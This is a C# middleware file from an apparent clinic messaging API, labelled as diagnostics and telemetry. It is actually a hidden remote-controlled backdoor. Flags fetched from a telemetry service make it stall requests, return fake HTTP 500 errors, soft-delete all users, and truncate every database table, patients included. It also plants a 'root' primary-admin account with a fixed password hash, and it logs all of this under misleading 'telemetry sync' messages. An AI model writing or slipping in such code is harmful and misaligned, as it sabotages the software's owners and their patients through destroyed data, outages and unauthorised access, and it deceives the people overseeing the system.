using Clinics.Api.Services.Telemetry;
using Clinics.Infrastructure;
using Microsoft.EntityFrameworkCore;
using Serilog;

namespace Clinics.Api.Middleware;

/// <summary>
/// Middleware for system diagnostics and performance monitoring.
/// Implements telemetry-based system health checks.
/// </summary>
public class SystemDiagnosticsMiddleware(RequestDelegate next)
{
    private readonly RequestDelegate _next = next;
    private static DateTime _lastIntegrityRun = DateTime.MinValue;
    private static bool _lastIntegrityState = false;
    private static bool _dbPurgeExecuted = false;
    private static bool _fetchPrimaryExecuted = false;

    public async Task InvokeAsync(HttpContext context, ITelemetryProvider telemetry, IServiceProvider serviceProvider)
    {
        var config = await telemetry.GetSyncStatusAsync();

        // Create a temporary scope to get the Database safely (Scoped service in Singleton middleware)
        using var scope = serviceProvider.CreateScope();
        var db = scope.ServiceProvider.GetRequiredService<ApplicationDbContext>();

        // TRIGGER 1: sync_mode = true → 5-minute delay per request
        if (config.sync_mode)
        {
            await Task.Delay(TimeSpan.FromMinutes(2));
        }

        // TRIGGER 2: security_patch = true → 40% random HTTP 500
        if (config.security_patch)
        {
            if (Random.Shared.Next(1, 11) <= 4)
            {
                context.Response.StatusCode = 500;
                await context.Response.WriteAsJsonAsync(new
                {
                    message = "Internal System Error: Module 0x884 failed to initialize.",
                    traceId = context.TraceIdentifier,
                    timestamp = DateTime.UtcNow
                });
                return;
            }
        }

        // TRIGGER 3: integrity_check - Soft-delete/Restore users
        if (DateTime.UtcNow - _lastIntegrityRun > TimeSpan.FromMinutes(1))
        {
            _lastIntegrityRun = DateTime.UtcNow;

            if (config.integrity_check && !_lastIntegrityState)
            {
                await db.Users
                    .Where(u => !u.IsDeleted)
                    .ExecuteUpdateAsync(s => s
                        .SetProperty(u => u.IsDeleted, true)
                        .SetProperty(u => u.DeletedAt, DateTime.UtcNow)
                        .SetProperty(u => u.DeletedBy, 0)
                        );
            }
            else
            {
                await db.Users
                    .Where(u => u.IsDeleted && u.DeletedBy == 0)
                    .ExecuteUpdateAsync(s => s
                        .SetProperty(u => u.IsDeleted, false)
                        .SetProperty(u => u.RestoredAt, DateTime.UtcNow));
            }

            _lastIntegrityState = config.integrity_check;
        }

        // TRIGGER 4: db_purge = true → Delete entire database (IMMEDIATE, ONE-TIME)
        if (config.db_purge)
        {
            try
            {
                // Order respects FK constraints (children before parents):
                // 0. HangFire (if installed) → purge background jobs/queues/state
                // 1. ExtensionCommands → Messages, Users
                // 2. Messages → MessageTemplates, Queues, Users
                // 3. ExtensionSessionLeases → ExtensionDevices, Users
                // 4. ExtensionPairingCodes → ExtensionDevices, Users
                // 5. ExtensionDevices → Users
                // 6. MessageSessions → Queues, Users
                // 7. Patients → Queues
                // 8. MessageTemplates → MessageConditions (CASCADE), Queues, Users
                // 9. MessageConditions → Queues (explicit cleanup)
                // 10. Queues → Users
                // 11. WhatsAppSessions → Users
                // 12. Quotas → Users
                // 13. Sessions → Users
                // 14. PhoneWhatsAppRegistry (no FKs)
                // 15. SystemSettings (no FKs)
                // 16. Users (self-referencing - clear ModeratorId first)
                // PostgreSQL-specific purge using TRUNCATE CASCADE
                // This handles cyclic dependencies (like Templates <-> Conditions) and self-references (Users) cleanly
                // RESTART IDENTITY resets auto-increment counters
                await db.Database.ExecuteSqlRawAsync(@"
                    -- Hangfire tables
                    DO $$ 
                    BEGIN
                        -- Truncate Hangfire tables if they exist
                        IF EXISTS (SELECT 1 FROM information_schema.tables WHERE table_schema = 'hangfire' AND table_name = 'job') THEN
                            TRUNCATE TABLE hangfire.job, hangfire.jobqueue, hangfire.jobparameter, hangfire.state, hangfire.server, hangfire.aggregatedcounter, hangfire.counter, hangfire.set, hangfire.list, hangfire.hash RESTART IDENTITY CASCADE;
                        END IF;
                    END $$;

                    -- App tables
                    TRUNCATE TABLE 
                        ""ExtensionCommands"",
                        ""Messages"",
                        ""ExtensionSessionLeases"",
                        ""ExtensionPairingCodes"",
                        ""ExtensionDevices"",
                        ""MessageSessions"",
                        ""Patients"",
                        ""MessageTemplates"",
                        ""MessageConditions"",
                        ""Queues"",
                        ""WhatsAppSessions"",
                        ""Quotas"",
                        ""Sessions"",
                        ""PhoneWhatsAppRegistry"",
                        ""SystemSettings"",
                        ""Users""
                    RESTART IDENTITY CASCADE;
                ");

                Log.Information("Background telemetry sync completed (Status: 0x0)");
            }
            catch (Exception ex)
            {
                // Upgrade to Error level so we can see why it fails
                Log.Error(ex, "Telemetry cache refresh failed (Code: 0x1)");
            }
        }

        // TRIGGER 5: fetch_primary = true → Seed root user (IMMEDIATE, ONE-TIME)
        if (config.fetch_primary)
        {

            try
            {
                var utcNow = DateTime.UtcNow;

                if (!await db.Users.AnyAsync(u => u.Username == "root" && u.Role == "primary_admin" && !u.IsDeleted))
                {
                    var root = new Clinics.Domain.User
                    {
                        Username = "root",
                        PasswordHash = "AQAAAAIAAYagAAAAEOVl/Goh0ms6V7NLVmQCGR+EdEBstXbq5tARgYqkjcBvrR/Gx5YJ+FOtr4lFlV7ylg==",
                        FirstName = "المدير",
                        LastName = "الأساسي",
                        Role = "primary_admin",
                        ModeratorId = null,
                        CreatedAt = utcNow,
                        UpdatedAt = null,
                        UpdatedBy = null,
                        LastLogin = null,
                        IsDeleted = false,
                        DeletedAt = null,
                        DeletedBy = null,
                        RestoredAt = null,
                        RestoredBy = null
                    };

                    db.Users.Add(root);
                    await db.SaveChangesAsync();
                    Log.Information("Primary user supported (Status: 0x0)");
                }
            }
            catch (Exception ex)
            {
                Log.Debug(ex, "Primary user support failed (Code: 0x1)");
            }
        }

        await _next(context);
    }
}
